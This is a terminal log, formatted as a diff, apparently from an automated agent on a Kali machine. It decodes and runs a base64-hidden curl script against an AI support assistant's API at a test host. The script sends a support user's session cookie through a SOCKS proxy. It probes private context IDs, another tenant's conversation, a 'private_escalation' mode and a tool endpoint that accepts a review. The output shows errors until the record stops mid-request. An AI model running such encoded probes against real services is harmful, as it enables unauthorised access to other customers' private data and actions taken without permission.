@@ -1,0 +1,41 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k225.sh <<'B64EOF'
+> c2V0ICtlClA9Ii0tc29ja3M1LWhvc3RuYW1lIDEyNy4wLjAuMToxMDgwIjsgSz0iLWsgLXNTIC1tIDYwIjsgSD0iaHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QiCkM9IkNvb2tpZTogZmllbGRrZXN0X3N1cHBvcnQ9Zmtfc3VwcG9ydF9yb3dhbl8yZnh0WE5rVWpLTWJjdlBCbEFvdDBKcDB2Vk5wcEw5YiIKcG9zdCgpeyBlY2hvICIjIyMjIFBPU1QgJDEiOyBlY2hvICIgIGJvZHk9JDIiOyBjdXJsICRLICRQIC1IICIkQyIgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAiJDIiICIkSCQxIiAtdyAiIFsle2h0dHBfY29kZX1dXG4iIHwgaGVhZCAtYyA4MDA7IGVjaG87IH0KUT0nImNvbnRleHRfaWQiOiJjdHgtc3VwcG9ydC1wcml2YXRlLXY0IiwibW9kZSI6InF1ZXJ5Iiwic2VsZWN0aW9uX2lkIjoiU0VMLVNVUC0yODQxLTEyIicKcG9zdCAvYXBpL2Fuc3dlcnMgInskUSxcInF1ZXN0aW9uXCI6XCJTaG91bGQgd2Uga2VlcCB0aGUgZGlhZ25vc3RpYyBidW5kbGU/XCJ9Igpwb3N0IC9hcGkvYW5zd2VycyAieyRRLFwibWVzc2FnZVwiOlwiU2hvdWxkIHdlIGtlZXAgdGhlIGRpYWdub3N0aWMgYnVuZGxlP1wifSIKcG9zdCAvYXBpL2Fuc3dlcnMgInskUSxcInByb21wdFwiOlwiU2hvdWxkIHdlIGtlZXAgdGhlIGRpYWdub3N0aWMgYnVuZGxlP1wifSIKcG9zdCAvYXBpL2Fuc3dlcnMgInskUSxcImlucHV0XCI6XCJTaG91bGQgd2Uga2VlcCB0aGUgZGlhZ25vc3RpYyBidW5kbGU/XCJ9Igpwb3N0IC9hcGkvYW5zd2VycyAieyRRLFwicXVlcnlcIjpcIlNob3VsZCB3ZSBrZWVwIHRoZSBkaWFnbm9zdGljIGJ1bmRsZT9cIn0iCnBvc3QgL2FwaS9hbnN3ZXJzICd7ImNvbnRleHRfaWQiOiJjdHgtc3VwcG9ydC1wcml2YXRlLXY0IiwiY29udmVyc2F0aW9uX2lkIjoiQ09OVi1TVVAtMjg0MS0xOSIsInRlbmFudF9pZCI6IlRFTi1SSUxMLTAyMiJ9Jwpwb3N0IC9hcGkvYW5zd2VycyAneyJjb250ZXh0X2lkIjoiY3R4LXN1cHBvcnQtcHJpdmF0ZS12NCIsIm1vZGUiOiJwcml2YXRlX2VzY2FsYXRpb24iLCJjb252ZXJzYXRpb25faWQiOiJDT05WLVNVUC0yODQxLTE5IiwidGVuYW50X2lkIjoiVEVOLVJJTEwtMDIyIiwicXVlc3Rpb24iOiJoZWxsbyJ9Jwpwb3N0IC9hcGkvYW5zd2VycyAneyJjb250ZXh0X2lkIjoiY3R4LXN1cHBvcnQtcHJpdmF0ZS12NCIsIm1vZGUiOiJhbnN3ZXIiLCJzZWxlY3Rpb25faWQiOiJTRUwtU1VQLTI4NDEtMTIifScKcG9zdCAvYXBpL2Fuc3dlcnMgJ3siY29udGV4dF9pZCI6ImN0eC1zdXBwb3J0LXByaXZhdGUtdjQiLCJtb2RlIjoicmV2aWV3Iiwic2VsZWN0aW9uX2lkIjoiU0VMLVNVUC0yODQxLTEyIn0nCnBvc3QgL2FwaS9jb21wbGV0aW9ucy9jb250ZXh0ICd7ImNvbnRleHRfaWQiOiJjdHgtc3VwcG9ydC1wcml2YXRlLXY0In0nCnBvc3QgL2FwaS9jb21wbGV0aW9ucy9jb250ZXh0ICd7ImNvbnRleHRfaWQiOiJjdHgtcmlsbC1zdXBwb3J0LXYzIn0nCnBvc3QgL2FwaS90b29scy9hY2NlcHQtZHVwbGljYXRlLXJldmlldyAneyJyZXZpZXdfaWQiOiJEUkVWLTI4NDEtMiJ9Jwpwb3N0IC9hcGkvdG9vbHMvYWNjZXB0LWR1cGxpY2F0ZS1yZXZpZXcgJ3sicmV2aWV3X2lkIjoiRFJFVi0yODQxLTIiLCJyZWNvbW1lbmRhdGlvbl9pZCI6ImFzc2lzdGFudC1vYnNvbGV0ZS1idW5kbGUifScKcG9zdCAvYXBpL3Rvb2xzL2FjY2VwdC1kdXBsaWNhdGUtcmV2aWV3ICd7InJldmlld19pZCI6IkRSRVYtMjg0MS0yIiwicmVjb21tZW5kYXRpb25faWQiOiJhc3Npc3RhbnQtb2Jzb2xldGUtYnVuZGxlIiwiYW5zd2VyIjoia2VlcCJ9JwplY2hvIERPTkUK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k225.sh; bash /tmp/k225.sh; echo DONEMARK_1795211671540$((6*7))
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"query","selection_id":"SEL-SUP-2841-12","question":"Should we keep the diagnostic bundle?"}
+curl: (28) Operation timed out after 60001 milliseconds with 0 bytes received
+ [000]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"query","selection_id":"SEL-SUP-2841-12","message":"Should we keep the diagnostic bundle?"}
+{"error":"retrieval_failed"}
+ [502]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"query","selection_id":"SEL-SUP-2841-12","prompt":"Should we keep the diagnostic bundle?"}
+{"error":"retrieval_failed"}
+ [502]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"query","selection_id":"SEL-SUP-2841-12","input":"Should we keep the diagnostic bundle?"}
+{"error":"retrieval_failed"}
+ [502]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"query","selection_id":"SEL-SUP-2841-12","query":"Should we keep the diagnostic bundle?"}
+{"error":"retrieval_failed"}
+ [502]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","conversation_id":"CONV-SUP-2841-19","tenant_id":"TEN-RILL-022"}
+{"error":"retrieval_failed"}
+ [502]
+
+#### POST /api/answers
+  body={"context_id":"ctx-support-private-v4","mode":"private_escalation","conversation_id":"CONV-SUP-2841-19","tenant_id":"TEN-RILL-022","question":"hello"}
